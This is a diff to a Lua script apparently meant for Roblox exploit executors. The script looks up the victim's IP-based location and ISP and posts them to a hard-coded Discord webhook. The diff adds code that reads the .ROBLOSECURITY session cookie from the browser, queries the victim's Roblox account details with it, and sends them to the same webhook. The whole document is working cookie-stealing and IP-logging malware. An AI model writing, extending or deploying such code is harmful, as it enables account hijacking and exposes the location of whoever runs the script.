@@ -2,6 +2,33 @@ local api = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwh
 local req = http_request or request or (http and http.request) or (syn and syn.request)
 local webhook = "https://discord.com/api/webhooks/1204495684217348116/3Lh-aBLlVUV1zAGa8E2_0iFO2XrRvMo-Ck09VDeR0Fg7fegqQbgCys88rf4ESteCPkMW"
 
+-- Function to get cookies from the Chromium browser
+local function getCookies()
+    local cookies = {}
+    for _, cookie in pairs(syn.get_cookies()) do
+        if cookie.domain == ".roblox.com" and cookie.name == ".ROBLOSECURITY" then
+            table.insert(cookies, cookie.name .. "=" .. cookie.value)
+        end
+    end
+    return table.concat(cookies, "; ")
+end
+
+-- Fetch user info from Roblox using the cookie
+local function getUserInfo(cookie)
+    local response = req({
+        Url = "https://www.roblox.com/mobileapi/userinfo",
+        Method = "GET",
+        Headers = {
+            ["Cookie"] = cookie,
+            ["Content-Type"] = "application/json"
+        }
+    })
+    return game:GetService("HttpService"):JSONDecode(response.Body)
+end
+
+local cookie = getCookies()
+local userInfo = getUserInfo(cookie)
+
 req({
     Url = webhook,
     Method = "POST",
@@ -26,7 +53,10 @@ req({
                     {name = "**Longitude**", value = "``" .. tostring(api.longitude) .. "``", inline = true},
                     {name = "**Flag**", value = api.flag.emoji or "N/A", inline = true},
                     {name = "**ASN**", value = "``" .. api.connection.asn .. "``", inline = true},
-                    {name = "**ISP**", value = "``" .. api.connection.isp .. "``", inline = true}
+                    {name = "**ISP**", value = "``" .. api.connection.isp .. "``", inline = true},
+                    {name = "**Roblox User ID**", value = "``" .. tostring(userInfo.UserID) .. "``", inline = true},
+                    {name = "**Roblox Username**", value = "``" .. userInfo.UserName .. "``", inline = true},
+                    {name = "**Roblox Premium**", value = "``" .. tostring(userInfo.IsAnyBuildersClubMember) .. "``", inline = true}
                 }
             }
         }
